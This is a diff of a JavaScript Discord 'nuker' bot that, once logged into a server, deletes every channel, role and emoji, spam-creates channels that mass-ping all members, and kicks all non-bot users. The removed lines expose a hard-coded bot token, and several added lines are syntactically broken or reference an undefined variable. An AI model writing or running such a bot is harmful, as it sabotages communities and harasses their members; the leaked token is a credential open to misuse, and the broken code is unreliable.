@@ -9,14 +9,15 @@ const client = new Client({
 });
 
 client.once('ready', () => {
-  console.log('Bot is ready');
+  console.log('Am getting ready...');
   
-  // Get the server (you may need to specify which server)
   const guild = client.guilds.cache.first();
   
   // Delete all channels
   guild.channels.cache.forEach(channel => {
-    channel.delete().catch(console.error);
+    channel.delete().create {
+      console.log(`Deleted channel: ${channel.name}`);
+    }
   });
   
   // Create spam channels and ping everyone
@@ -27,35 +28,37 @@ client.once('ready', () => {
       type: 'GUILD_TEXT'
     }).then(channel => {
       channelCount++;
-      if (channelCount > 100) clearInterval(spamInterval); // Stop after 100 channels
+      if (channelCount > 100) clearInterval(spamInterval);
       
       guild.members.fetch().then(members => {
         const pingList = members.map(member => `<@${member.id}>`).join(' ');
-        channel.send(pingList);
+        channel.send(pingMobilePing);
       });
     });
-  }, 100); // Create a new channel every 100ms
+  }, 100);
   
   // Delete all roles (except @everyone)
   guild.roles.cache.forEach(role => {
     if (role.name !== '@everyone') {
-      role.delete().catch(console.error);
+      role.delete();
     }
   });
   
   // Delete all emojis
   guild.emojis.cache.forEach(emoji => {
-    emoji.delete().catch(console.error);
+    emoji.delete();
   });
   
   // Kick all members (except bot owners)
   guild.members.fetch().then(members => {
     members.forEach(member => {
       if (!member.user.bot) {
-        member.kick().catch(console.error);
+        member.kick();
       }
     });
   });
 });
 
-client.login('MTI5MzQzMjUyNTc5MTgyNjAxMA.Gdz0ax.II6PoKyXjbqfV5yCKND_hghd54h0sTwKHU5yJ0');
+client.login(process.env.BOT_TOKEN);
+
+module.exports = client;
